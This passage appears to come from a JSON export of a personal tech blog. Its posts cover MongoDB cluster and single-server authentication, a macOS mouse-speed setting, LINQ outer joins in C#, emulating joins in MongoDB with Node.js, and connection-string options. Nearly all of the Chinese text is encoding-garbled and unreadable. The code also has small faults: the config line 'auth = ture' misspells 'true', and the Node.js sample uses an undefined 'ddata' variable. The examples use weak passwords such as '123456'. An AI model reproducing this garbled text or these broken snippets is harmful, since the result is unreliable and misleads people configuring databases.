)æƒé™æ§åˆ¶MongoDBé»˜è®¤ä¸ºéªŒè¯æ¨¡å¼ã€‚å¦‚éœ€å¯¹æ•°æ®åº“è¿›è¡Œæƒé™æ§åˆ¶ï¼Œéœ€å…ˆé‡‡ç”¨æ— éªŒè¯æ¨¡å¼ç™»å½•ï¼Œè¿›å…¥adminåº“åˆ›å»ºç®¡ç†å‘˜ç”¨æˆ·åï¼Œå†é‡‡ç”¨éªŒè¯æ¨¡å¼ç™»å½•ã€‚é€šè¿‡å‰é¢åˆ›å»ºçš„ç®¡ç†å‘˜å¸å·è¿›è¡Œæ•°æ®åº“ä¸ç”¨æˆ·çš„åˆ›å»ºã€‚MongoDBé›†ç¾¤çš„æƒé™ä¸å•å°çš„æƒé™æ§åˆ¶çš„ä¸åŒä¹‹å¤„åœ¨äºï¼Œå•å°æ˜¯é€šè¿‡-authå±æ€§ï¼Œé›†ç¾¤æ˜¯é€šè¿‡keyFileæ¥è¿›è¡ŒæœåŠ¡å™¨é—´çš„éªŒè¯ã€‚ä»¥ä¸‹ä»‹ç»é…ç½®å…¨è¿‡ç¨‹ã€‚å‰é¢çš„æ‰€æœ‰æ­¥éª¤ï¼Œéƒ½æ˜¯åœ¨nosecurityæ¨¡å¼ä¸‹è¿›è¡Œã€‚å¦‚æœæ²¡æœ‰é‡‡ç”¨ééªŒè¯æ¨¡å¼çš„éœ€è¦å°†æ‰€æœ‰è¿›ç¨‹ï¼ˆåˆ†ç‰‡ã€é…ç½®ã€mongosï¼‰åœæ­¢ï¼Œå°†åˆ‡æ¢åˆ°æ— éªŒè¯æ¨¡å¼ã€‚æ­¥éª¤ä¸€ï¼šå…ˆè¿›è¡Œç™»å½•ï¼Œå¹¶åˆ‡æ¢è¿›adminåº“åˆ›å»ºç®¡ç†å‘˜å¸å· /usr/local/mongodb/bin/mongo --port 30000mongos&gt;use adminmongos&gt;db.addUser(â€˜adminâ€™,â€˜123456â€™){ &quot;singleShard&quot; :&quot;192.168.2.88:20000,192.168.2.89:20000,192.168.2.90:20000&quot;, &quot;n&quot; : 0, &quot;connectionId&quot; : 211, &quot;err&quot; : null, &quot;ok&quot; : 1 }{ &quot;_id&quot; :ObjectId(&quot;4f6c78ddad912a3ac6833ece&quot;), &quot;user&quot; : &quot;admin&quot;, &quot;readOnly&quot; : false, &quot;pwd&quot; :&quot;95ec4261124ba5951720b199908d892b&quot; }éªŒè¯ç”¨æˆ·åä¸å¯†ç mongos&gt; db.auth(â€˜adminâ€™,â€˜123456â€™)1mongos&gt;exitæ­¥éª¤äºŒï¼šé€€å‡ºåï¼Œå°†Server1\\Server2\\Server3æœåŠ¡å™¨ä¸ŠMongoDBçš„æ‰€æœ‰è¿›ç¨‹ï¼ˆåˆ†ç‰‡ã€é…ç½®ã€mongosï¼‰åœæ­¢ï¼Œå°†åˆ‡æ¢åˆ°éªŒè¯æ¨¡å¼ã€‚å…·ä½“å‘½ä»¤å¦‚ä¸‹ï¼š killall mongod mongos netstat -lnpt /usr/local/mongodb/bin/mongod -f /data/mongodb/conf/security/shard1.conf /usr/local/mongodb/bin/mongod -f /data/mongodb/conf/security/shard2.conf /usr/local/mongodb/bin/mongod -f /data/mongodb/conf/security/shard3.conf netstat -lnpt # ps -ef | grep mongo /usr/local/mongodb/bin/mongod -f /data/mongodb/conf/security/configsvr.conf /usr/local/mongodb/bin/mongos -f /data/mongodb/conf/security/mongos.confå¯åŠ¨åï¼Œå¦‚å¯¹åº“è¿›è¡ŒæŸ¥çœ‹ï¼Œåˆ™ä¼šæŠ¥ä»¥ä¸‹å¼‚å¸¸ï¼š /usr/local/mongodb/bin/mongo 10.10.113.122:30000/adminMongoDB shell version: 2.0.4connecting to:10.10.113.122:30000/adminshow dbsFri Mar 23 22:28:28 uncaughtexception: listDatabases failed:{ â€œokâ€ : 0, â€œerrmsgâ€ :â€œunauthorizedâ€ }ä»¥ä¸‹æ˜¯æ­£å¸¸ç™»å½•åæ˜¾ç¤ºçš„ä¿¡æ¯ï¼š /usr/local/mongodb/bin/mongo 10.10.113.122:30000/adminMongoDB shell version: 2.0.4connecting to:10.10.113.122:30000/admindb.auth(â€˜adminâ€™,â€˜123456â€™)1mongos&gt;æ­¥éª¤ä¸‰ï¼šä»¥ä¸‹æ˜¯æ•°æ®åº“åŠæ•°æ®åº“ç”¨æˆ·åˆ›å»ºçš„è¿‡ç¨‹ï¼šmongos&gt; use helloswitched to db hellomongos&gt;db.addUser(â€˜saâ€™,â€˜saâ€™){ &quot;singleShard&quot; :&quot;shard2/10.10.113.122:10002,10.10.113.132:10002,10.10.113.133:10002&quot;, &quot;n&quot; : 0, &quot;lastOp&quot; :NumberLong(&quot;5723101431532093441&quot;), &quot;connectionId&quot; : 38, &quot;err&quot; : null, &quot;ok&quot; : 1 }{ &quot;user&quot; : &quot;sa&quot;, &quot;readOnly&quot; : false, &quot;pwd&quot; :&quot;75692b1d11c072c6c79332e248c4f699&quot;, &quot;_id&quot; :ObjectId(&quot;4f6c8a6e9f67b049a20a00de&quot;) }mongos&gt; exitbye /usr/local/mongodb/bin/mongo 10.10.113.122:30000/hello -u sa -pMongoDB shell version: 2.0.4Enter password:connecting to:10.10.113.122:30000/helloshow collectionssystem.indexessystem.usersdb.system.users.find(){ â€œ_idâ€ :ObjectId(â€œ4f6c8a6e9f67b049a20a00deâ€), â€œuserâ€ :â€œsaâ€, â€œreadOnlyâ€ : false, â€œpwdâ€ :â€œ75692b1d11c072c6c79332e248c4f699â€ }åˆ†ç‰‡ /usr/local/mongodb/bin/mongo -port 30000use admindb.runCommand({â€œenableshardingâ€:â€œtestâ€})db.runCommand({â€œshardcollectionâ€:â€œtest.docâ€,â€œkeyâ€:{&quot;_id&quot;:1}})db.runCommand({â€œshardcollectionâ€:â€œtest.txtâ€,â€œkeyâ€:{&quot;_id&quot;:1}})ç´¢å¼•use testdb.fs.chunks.ensureIndex({files_id: 1});use admindb.runCommand({ shardcollection : â€œtest.fs.chunksâ€, key : { files_id : 1 }})ç´¢å¼•use testdb.doc.ensureIndex({â€œletterâ€:1})å¯¼å…¥æ•°æ®æŸ¥è¯¢æ•°æ®åˆ†ç‰‡ç®¡ç†use configshow collectionsdb.shards.find()db.databases.find()db.chunks.find()db.printShardingStatus()","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"mongodb","slug":"mongodb","permalink":"https://wangxiuwen.github.io/tags/mongodb/"}],"author":"wangxiuwen"},{"title":"mongod éªŒè¯é…ç½®æŒ‡å—(åäºŒ)","slug":"history/tech/5953c4d0c2b92f5665eed9d6","date":"2016-01-01T04:41:54.000Z","updated":"2020-11-29T01:42:08.751Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed9d6/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed9d6/","excerpt":"","text":"ä¸€. å‰è¨€æœ€è¿‘å…¬å¸åŠ å¼ºå®‰å…¨ï¼Œhttp://www.ttlsa.com/mongodbæ•°æ®è¦å¯ç”¨éªŒè¯ï¼Œé¡ºé“æ€»ç»“ä¸‹äº†ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œmongodbä¸å¯ç”¨éªŒè¯çš„ã€‚æ•°æ®åº“çº§åˆ«çš„æƒé™ï¼Œè¦ä¹ˆå¯è¯»å†™è¦ä¹ˆåªè¯»æƒé™ã€‚mongodçš„éªŒè¯é…ç½®æ¯”è¾ƒæ“è›‹ã€‚åˆ†ä¸¤ç§æƒ…å½¢ï¼šä¸€ç§æ˜¯å•æœåŠ¡å™¨ï¼Œåªéœ€å¯åŠ¨æ—¶æ·»åŠ --authå‚æ•°å³å¯ã€‚ å¦ä¸€ç§æ˜¯å¤åˆ¶é›†ã€åˆ†ç‰‡é›†ç¾¤æœåŠ¡å™¨ï¼Œå¿…é¡»æŒ‡å®škeyfileå‚æ•°ï¼Œå…¶ä»–èŠ‚ç‚¹ä¹‹é—´çš„é€šè®¯åŸºäºè¯¥keyfileã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œâ€“authå‚æ•°æ˜¯éšå«å¯ç”¨çš„ï¼Œæ‰€æœ‰çš„mongodbè®¿é—®éƒ½å¿…é¡»éªŒè¯çš„ã€‚äºŒ. å•æœåŠ¡å™¨æ¨¡å¼æ·»åŠ ç®¡ç†å‘˜ç”¨æˆ·ï¼Œadminåº“ä¸‹çš„ç”¨æˆ·æ˜¯å…¨å±€ç”¨æˆ·ï¼Œå¯¹æ‰€æœ‰çš„æ•°æ®åº“å¯è¯»å†™ã€‚1234 ./mongouse admindb.addUser(â€œrootâ€,â€œwww.ttlsa.comâ€)db.auth(â€œrootâ€,â€œwww.ttlsa.comâ€)åˆ›å»ºæ™®é€šçš„ç”¨æˆ·ï¼Œæ˜¯æ•°æ®åº“çº§åˆ«çš„ã€‚123use database_namedb.addUser(â€˜guestâ€™,â€˜www.ttlsa.comâ€™) å¯è¯»å†™db.addUser(â€˜guestâ€™,â€˜www.ttlsa.comâ€™,true) åªå¯è¯»æŸ¥çœ‹ç”¨æˆ·1db.system.users.find()åˆ é™¤ç”¨æˆ·123db.removeUser(username)æˆ–db.system.users.remove( { user: username } )é…ç½®æ–‡ä»¶åŠ ä¸Šä¸‹é¢çš„å‚æ•°åé‡æ–°å¯åŠ¨mongodå®ä¾‹1auth = tureä¸‰. å¤åˆ¶é›†ä¸åˆ†ç‰‡é›†ç¾¤æ¨¡å¼ä¸‹3.1 keyfileè§„åˆ™é›†ç¾¤æœåŠ¡å™¨ä¹‹é—´é€šè®¯é€šè¿‡keyfileè¿›è¡Œèº«ä»½éªŒè¯ã€‚æ¯ä¸ªå®ä¾‹çš„keyfileæ–‡ä»¶å†…å®¹è¦ä¸€è‡´ã€‚keyfileæ–‡ä»¶æƒé™ä»…å½“å‰ç”¨æˆ·å¯è¯»ã€‚é›†ç¾¤æˆå‘˜éƒ½éœ€è¦æŒ‡å®šâ€“keyFileå‚æ•°ã€‚æ¯ä¸ªå®¢æˆ·ç«¯è¿æ¥åˆ°æ•°æ®åº“ä¹‹å‰å¿…é¡»éªŒè¯ã€‚keyé•¿åº¦å¿…é¡»åœ¨6åˆ°1024ä¸ªå­—ç¬¦ä¹‹é—´ï¼Œå¦åˆ™ä¼šæŠ¥é”™ï¼Œmongodèµ·ä¸èµ·æ¥ã€‚ä»»ä½•ç©ºæ ¼è¢«å¿½ç•¥ã€‚keyä¸èƒ½åŒ…å«éæ³•å­—ç¬¦=ï¼Œå¦åˆ™ä¼šæŠ¥é”™ï¼Œmongodèµ·ä¸èµ·æ¥ã€‚3.2 åˆ›å»ºä¸€ä¸ªkeyfile1 openssl rand -base64 513 &gt; keyfileæœ€å¥½æ˜¯3çš„å€æ•°ï¼Œå¦åˆ™ä¼šå«æœ‰éæ³•å­—ç¬¦=ã€‚3.3 ä¿®æ”¹keyfileæƒé™12 chown mongod.mongod keyfile chmod 600 keyfile3.4 åˆ›å»ºä¸€ä¸ªç®¡ç†è´¦å·åœ¨å¯ç”¨â€“keyFIleåï¼Œè¿æ¥æ•°æ®åº“éƒ½å¿…é¡»è¦éªŒè¯çš„ã€‚123use admindb.addUser(â€œrootâ€,â€œwww.ttlsa.comâ€)db.auth(â€œrootâ€,â€œwww.ttlsa.comâ€)3.5 å¯ç”¨â€“keyFileä¿®æ”¹mongod.confæ–‡ä»¶ï¼Œæ·»åŠ ä¸‹é¢è¿™é¡¹1keyFile = /path/to/keyfile3.6 é‡æ–°å¯åŠ¨mongod1 ./mongod --config mongod.confåˆ›å»ºæ™®é€šç”¨æˆ·ä¸å•æœºæ¨¡å¼ä¸‹éªŒè¯ä¸€æ ·çš„ã€‚å¦‚éœ€è½¬è½½è¯·æ³¨æ˜å‡ºå¤„ï¼šhttp://www.ttlsa.com/html/2707.html","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"mongodb","slug":"mongodb","permalink":"https://wangxiuwen.github.io/tags/mongodb/"}],"author":"wangxiuwen"},{"title":"é¼ æ ‡è¿‡æ…¢é—®é¢˜","slug":"history/tech/5953c4d0c2b92f5665eed9db","date":"2016-01-01T03:58:32.000Z","updated":"2020-11-29T01:42:08.751Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed9db/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed9db/","excerpt":"","text":"defaults write .GlobalPreferences com.apple.mouse.scaling -1defaults read -g com.apple.mouse.scalingdefaults write -g com.apple.mouse.scaling 7.5","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"ç³»ç»Ÿæ“ä½œ","slug":"ç³»ç»Ÿæ“ä½œ","permalink":"https://wangxiuwen.github.io/tags/%E7%B3%BB%E7%BB%9F%E6%93%8D%E4%BD%9C/"}],"author":"wangxiuwen"},{"title":"æ€æ ·åœ¨LINQå®ç° LEFT JOIN æˆ–è€…RIGHT JOIN","slug":"history/tech/5953c4d0c2b92f5665eed9d5","date":"2016-01-01T02:26:09.000Z","updated":"2020-11-29T01:42:08.751Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed9d5/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed9d5/","excerpt":"","text":"In this post let us see how we can handle Left Join and Right Join when using LINQ. There are no keywords defined in C#, we have to use DefaultIfEmpty() function to get the desired result.Let us see how we can achieve it.To make you understand better I use a Employee -&gt; Department realation to explain.First we shall create two classes namely Employee and Departmentclass Employee {public string Name { get; set; }public int ID { get; set; }public int DeptID { get; set; }}class Department {public int ID { get; set; }public string Name { get; set; }}Lets create some objects of both the classes and fill some dummy data in it.Employee emp1 = new Employee() { ID = 1, Name = â€œAâ€, DeptID = 1};Employee emp2 = new Employee() { ID = 2, Name = â€œBâ€, DeptID = 1};Employee emp3 = new Employee() { ID = 3, Name = â€œCâ€, DeptID = 1 };Employee emp4 = new Employee() { ID = 4, Name = â€œDâ€, DeptID = 2 };Employee emp5 = new Employee() { ID = 5, Name = â€œEâ€, DeptID = 2 };Employee emp6 = new Employee() { ID = 6, Name = â€œFâ€, DeptID = 2 };Employee emp7 = new Employee() { ID = 7, Name = â€œGâ€, DeptID = 6 };Employee emp8 = new Employee() { ID = 8, Name = â€œHâ€, DeptID = 3 };Employee emp9 = new Employee() { ID = 9, Name = â€œIâ€, DeptID = 3 };Employee emp10 = new Employee() { ID = 10, Name = â€œJâ€, DeptID = 7};Employee emp11 = new Employee() { ID = 11, Name = â€œKâ€, DeptID = 7};Employee emp12 = new Employee() { ID = 12, Name = â€œLâ€, DeptID = 5};Department Dept1 = new Department() { ID = 1, Name = â€œDevelopmentâ€};Department Dept2 = new Department() { ID = 2, Name = â€œTestingâ€};Department Dept3 = new Department() { ID = 3, Name = â€œMarketingâ€};Department Dept4 = new Department() { ID = 4, Name = â€œSupportâ€};ListListOfEmployees = new List();ListOfEmployees.AddRange((new Employee[] { emp1, emp2, emp3, emp4, emp5, emp6, emp7,emp8, emp9, emp10, emp11, emp12 }));ListListOfDepartment = new List();ListOfDepartment.AddRange( new Department[]{ Dept1,Dept2,Dept3,Dept4});So we finish loading the objects into ListOfEmployees and ListOfDepartments, using this lists we shall see how we can join them to get the results.First let us see what would be the query in SQL if we had the same structure in our tables.For Left join and right join we would have used the queryâ€“Left Join in SQLselect Emp.Name, Dept.Name from Employee Emp left join Department Dept onEmp.DeptID = Dept.IDâ€“Right Join In SQLselect Emp.Name, Dept.Name from Employee Emp right join Department Dept onEmp.DeptID = Dept.IDUsing LINQ, Left Join can be acheived as followsvar LeftJoin = from emp in ListOfEmployeesjoin dept in ListOfDepartmenton emp.DeptID equals dept.ID into JoinedEmpDept from dept in JoinedEmpDept.DefaultIfEmpty()select new {EmployeeName = emp.Name,DepartmentName = dept != null ? dept.Name : null };And for Right Join there is no pretty difference, we just need to reverse the joining in first 2 lines. Here it followsvar RightJoin = from dept in ListOfDepartmentjoin employee in ListOfEmployeeson dept.ID equals employee.DeptID into joinDeptEmpfrom employee in joinDeptEmp.DefaultIfEmpty()select new {EmployeeName = employee != null ? employee.Name : null,DepartmentName = dept.Name};","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"mongodb","slug":"mongodb","permalink":"https://wangxiuwen.github.io/tags/mongodb/"}],"author":"wangxiuwen"},{"title":"mongodbçš„joinæ“ä½œç®€æ","slug":"history/tech/5953c4d0c2b92f5665eed9d4","date":"2016-01-01T02:25:34.000Z","updated":"2020-11-29T01:42:08.751Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed9d4/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed9d4/","excerpt":"","text":"ä¼—æ‰€å‘¨çŸ¥ï¼Œmongodbæ˜¯ä¸æ”¯æŒjoinæ“ä½œçš„ï¼Œå› æ­¤æˆ‘ä»¬åªèƒ½è‡ªå·±æ¥å®ç°è¿™ä¸ªåŠŸèƒ½ã€‚å‰æ®µæ—¶é—´ï¼Œæˆ‘é‡åˆ°è¿™ä¸ªä¸€ä¸ªä¸šåŠ¡åœºæ™¯ï¼šcollection A çš„æ•°æ®æ ¼å¼ï¼š{ â€œ_idâ€ : { â€œusernameâ€ : â€œjifeng.zjdâ€, â€œversionâ€ : 2 }, â€œvalueâ€ : 1 }collection B çš„æ•°æ®æ ¼å¼ï¼š www.2cto.com{ â€œuser_idâ€ : 12630, â€œusernameâ€ : â€œjifeng.zjdâ€ } Aè¡¨çš„æ•°æ®é‡ä¸º2wï¼ŒBè¡¨çš„æ•°æ®é‡ä¸º25wã€‚ä¸ºäº†è¯´æ˜ç®€å•ï¼Œæˆ‘ç®€åŒ–ä¸‹éœ€æ±‚ï¼Œå°±æ˜¯è®¡ç®—A._id.username = B.username çš„Bè¡¨ä¸­çš„ç”¨æˆ·æ•°æ®ï¼Œä¹Ÿå°±æ˜¯æ±‚Aå’ŒBçš„äº¤é›†ã€‚æ²¡æœ‰joinï¼Œæ€ä¹ˆåŠå‘¢ï¼Ÿ ç›¸ä¿¡å¤§å®¶éƒ½åº”è¯¥æœ‰è‡ªå·±çš„è§£ç­”äº†ï¼Œç”±äºAè¡¨çš„æ•°æ®é‡ç›¸å¯¹äºBè¡¨æ¥è®²æ˜¯å°‘çš„ï¼Œæ‰€ä»¥å¯ä»¥å…ˆå–å‡ºAè¡¨çš„æ‰€æœ‰æ•°æ®ï¼Œç„¶åå»Bè¡¨æŸ¥è¯¢ï¼Œçœ‹é‚£äº›æ•°æ®åŒæ—¶å­˜åœ¨äºAå’ŒBè¡¨ä¸­ã€‚å½“ç„¶åœ¨mongodbä¸­å¯¹Aå’ŒBå»ºç«‹é€‚å½“çš„ç´¢å¼•æ˜¯éå¸¸å¿…è¦çš„ã€‚æˆ‘é‡‡ç”¨çš„æ–¹æ³•æ˜¯å¯¹Bè¡¨çš„usernameå­—æ®µè¿›è¡Œç´¢å¼•ã€‚ å¦‚å¯¹mongodbç´¢å¼•ä¸äº†è§£ï¼Œå¯ä»¥å‚è§è§†é¢‘æ•™ç¨‹ã€ŠmongoDBçš„ç´¢å¼•ä½¿ç”¨åŠç´¢å¼•æœºåˆ¶ã€‹ï¼ˆhttp://blog.nosqlfan.com/http://www.2cto.com/kf/qianduan/css//758.htmlï¼‰ä¸€æ–‡ã€‚è¿™é‡Œæˆ‘ä½¿ç”¨çš„è¯­è¨€æ˜¯nodejsï¼Œnode_moduleé‡‡ç”¨çš„mongoskinï¼Œæˆ‘åˆšå¼€å§‹å†™äº†ä¸€ä¸ªç®€å•çš„å®ç°ï¼šdb.A.find({}, {}, function(err, adata){if (err) return callback(err);//å¾—åˆ°Aè¡¨ä¸­çš„æ‰€æœ‰æ•°æ®adata.toArray(function(err, aArray){if (err) return callback(err);var len = aArray.length;var result = [];for (var i = 0; i &lt; len; i++) {var item = aArray;var username = item._id.username;var op = {username: username};//æŸ¥çœ‹Bè¡¨ä¸­è¿™æ¡æ•°æ®db.B.findOne(op, {}, function(err, data){allcount++; www.2cto.comif (data) {result.push(data.username);}if (allcount === len) {callback(null, result);}})}})})è¿™æ®µä»£ç æ˜¯èƒ½æ»¡è¶³ä¸šåŠ¡éœ€æ±‚ï¼Œä½†å¤§å®¶æœ‰æ²¡æœ‰å‘ç°å®ƒå­˜åœ¨ä¸€ä¸ªè‡´å‘½çš„é—®é¢˜ï¼Ÿå¯¹ï¼Œè¿è¡Œé€Ÿåº¦æ…¢ï¼ åŸå› å¾ˆç®€å•ï¼Œæˆ‘æ˜¯ä»Aè¡¨ä¸­æ‰¹é‡å–åˆ°æ‰€æœ‰æ•°æ®ï¼Œç„¶ååˆç”¨findOneæ–¹æ³•ä¸€æ¡æ¡å»Bè¡¨ä¸­æŸ¥è¯¢ï¼ŒAè¡¨ä¸­æœ‰2wæ•°æ®ï¼Œä¹Ÿå°±æ˜¯è¦æŸ¥Bè¡¨2wæ¬¡ï¼Œè™½ç„¶Bè¡¨ä¸­å·²ç»å»ºç«‹ç´¢å¼•ï¼Œä½†è¿™æ ·çš„æŸ¥è¯¢é€»è¾‘æ˜æ˜¾æ˜¯ä¸å¯æ¥å—ã€‚ çŸ¥é“é—®é¢˜æ‰€åœ¨ï¼Œè§£å†³æ–¹æ¡ˆä¹Ÿå°±æ¸…æ¥šäº†ï¼šå¯¹Bè¡¨è¿›è¡Œæ‰¹é‡æŸ¥è¯¢ï¼šdb.A.find({}, {}, function(err, adata){if (err) return callback(err);//å¾—åˆ°Aè¡¨ä¸­çš„æ‰€æœ‰æ•°æ®adata.toArray(function(err, aArray){if (err) return callback(err);var len = aArray.length;var result = [];var usernames = [];for (var i = 0; i &lt; len; i++) {var item = aArray;var username = item._id.username;usernames.push(username);}var op = {username: {$in: usernames}};//æŸ¥çœ‹Bè¡¨ä¸­è¿™æ¡æ•°æ® www.2cto.comdb.B.find(op, {}, function(err, bdata){ddata.toArray(function(err, barray){callback(barray);})})})})ç»è¿‡è¿™æ ·çš„ä¼˜åŒ–ï¼Œç¨‹åºæ€§èƒ½ä¼šæœ‰æ˜æ˜¾çš„æå‡ã€‚å¸Œæœ›å¯¹å¤§å®¶æœ‰æ‰€å¸®åŠ©ã€‚ä½œè€… æœ±ä½³å¢©","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"mongodb","slug":"mongodb","permalink":"https://wangxiuwen.github.io/tags/mongodb/"}],"author":"wangxiuwen"},{"title":"MongoDBçš„è¿æ¥å­—ç¬¦ä¸²çš„ä»‹ç»","slug":"history/tech/5953c4d0c2b92f5665eed9d3","date":"2016-01-01T02:25:07.000Z","updated":"2020-11-29T01:42:08.751Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed9d3/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed9d3/","excerpt":"","text":"MongoDBè¿æ¥å­—ç¬¦ä¸²å¸¸ç”¨æ ¼å¼mongodb://host1[,host2,â€¦[,hostN[/[?optionsï¼½å¤‡æ³¨ï¼šå­—ç¬¦ä¸²è¿æ¥ä¸åŒºåˆ†å¤§å°å†™ï¼Œå¹¶éæ‰€æœ‰MongoDBé©±åŠ¨éƒ½æ”¯æŒå®Œæ•´çš„è¿æ¥å­—ç¬¦ä¸²ï¼Œä¸æ”¯æŒæ­¤æ ¼å¼è¿æ¥å­—ä¸²çš„é©±åŠ¨ä¼šæœ‰æ›¿ä»£è¿æ¥æ–¹æ¡ˆï¼Œå…·ä½“è¯·å‚ç…§é©±åŠ¨è‡ªèº«çš„è¯´æ˜æ–‡æ¡£ï¼Œçœ‹çœ‹å¦‚ä½•å®šä¹‰uriæ ‡å‡†è¿æ¥çš„ã€‚1ã€å‚æ•°è¯´æ˜ mongodb:// è¿™æ˜¯å›ºå®šçš„æ ¼å¼ï¼Œå¿…é¡»è¦æŒ‡å®šã€‚ ï¬ username:password@ å¯é€‰é¡¹ï¼Œå¦‚æœè®¾ç½®ï¼Œåœ¨è¿æ¥æ•°æ®åº“æœåŠ¡å™¨ä¹‹åï¼Œé©±åŠ¨éƒ½ä¼šå°è¯•ç™»é™†è¿™ä¸ªæ•°æ®åº“ï¬ host1 å¿…é¡»çš„æŒ‡å®šè‡³å°‘ä¸€ä¸ªhosthost1 æ˜¯è¿™ä¸ªURIå”¯ä¸€è¦å¡«å†™çš„ã€‚å®ƒæŒ‡å®šäº†è¦è¿æ¥æœåŠ¡å™¨çš„åœ°å€ã€‚å¦‚æœè¦è¿æ¥å¤åˆ¶é›†ï¼Œè¯·æŒ‡å®šå¤šä¸ªä¸»æœºåœ°å€ã€‚ ï¬ :portX å¯é€‰çš„æŒ‡å®šç«¯å£ï¼Œå¦‚æœä¸å¡«ï¼Œé»˜è®¤ä¸º27017ï¬ /database å¦‚æœæŒ‡å®šusername:password@ï¼Œè¿æ¥å¹¶éªŒè¯ç™»é™†æŒ‡å®šæ•°æ®åº“ã€‚è‹¥ä¸æŒ‡å®šï¼Œé»˜è®¤æ‰“å¼€adminæ•°æ®åº“ã€‚ï¬ ?options æ˜¯è¿æ¥é€‰é¡¹ã€‚å¦‚æœä¸ä½¿ç”¨/databaseï¼Œåˆ™å‰é¢éœ€è¦åŠ ä¸Š/ã€‚æ‰€æœ‰è¿æ¥é€‰é¡¹éƒ½æ˜¯é”®å€¼å¯¹name=valueï¼Œé”®å€¼å¯¹ä¹‹é—´é€šè¿‡&amp;æˆ–;ï¼ˆåˆ†å·ï¼‰éš”å¼€2ã€options æ˜¯è¿æ¥å‚æ•°connect=direct|replicaSetdirect: è¿æ¥æ–¹å¼ä¸ºå•ä¸ªæœåŠ¡å™¨ã€‚å¦‚æœæä¾›äº†å¤šä¸ªä¸»æœºåœ°å€ï¼Œå»ºç«‹è¿æ¥ä¹‹åï¼ŒæŒ‰é¡ºåºè®¿é—®ã€‚å¦‚æœä»…ä»…æŒ‡å®šäº†ä¸€ä¸ªä¸»æœºï¼Œdirectæ˜¯é»˜è®¤å€¼ã€‚replicaSet: å°±å’Œæè¿°çš„é‚£æ ·ï¼Œè¿æ¥åˆ°replica set . è¿™ä¸ªä¸»æœºåœ°å€åˆ—è¡¨ï¼Œæ˜¯ä¸ºäº†å‘ç°replica setã€‚ å¦‚æœè¿æ¥å¤šä¸ªä¸»æœºreplicaSetæ˜¯é»˜è®¤å€¼ã€‚replicaSet=nameéªŒè¯replica setçš„åç§°ã€‚ Impliesconnect=replicaSet.slaveOk=true|falsetrue:åœ¨connect=directæ¨¡å¼ä¸‹ï¼Œé©±åŠ¨ä¼šè¿æ¥ç¬¬ä¸€å°æœºå™¨ï¼Œå³ä½¿è¿™å°æœåŠ¡å™¨ä¸æ˜¯ä¸»ã€‚åœ¨connect=replicaSetæ¨¡å¼ä¸‹ï¼Œé©±åŠ¨ä¼šå‘é€æ‰€æœ‰çš„å†™è¯·æ±‚åˆ°ä¸»å¹¶ä¸”æŠŠè¯»å–æ“ä½œåˆ†å¸ƒåœ¨å…¶ä»–ä»æœåŠ¡å™¨ã€‚false: åœ¨ connect=directæ¨¡å¼ä¸‹ï¼Œé©±åŠ¨ä¼šè‡ªåŠ¨æ‰¾å¯»ä¸»æœåŠ¡å™¨. åœ¨connect=replicaSet æ¨¡å¼ä¸‹ï¼Œé©±åŠ¨ä»…ä»…è¿æ¥ä¸»æœåŠ¡å™¨ï¼Œå¹¶ä¸”æ‰€æœ‰çš„è¯»å†™å‘½ä»¤éƒ½è¿æ¥åˆ°ä¸»æœåŠ¡å™¨ã€‚safe=true|falsetrue: åœ¨æ‰§è¡Œæ›´æ–°æ“ä½œä¹‹åï¼Œé©±åŠ¨éƒ½ä¼šå‘é€getLastErrorå‘½ä»¤æ¥ç¡®ä¿æ›´æ–°æˆåŠŸã€‚(è¿˜è¦å‚è€ƒ wtimeoutMS).false: åœ¨æ¯æ¬¡æ›´æ–°ä¹‹åï¼Œé©±åŠ¨ä¸ä¼šå‘é€getLastErroræ¥ç¡®ä¿æ›´æ–°æˆåŠŸã€‚w=né©±åŠ¨æ·»åŠ  { w : n } åˆ°getLastErrorå‘½ä»¤. 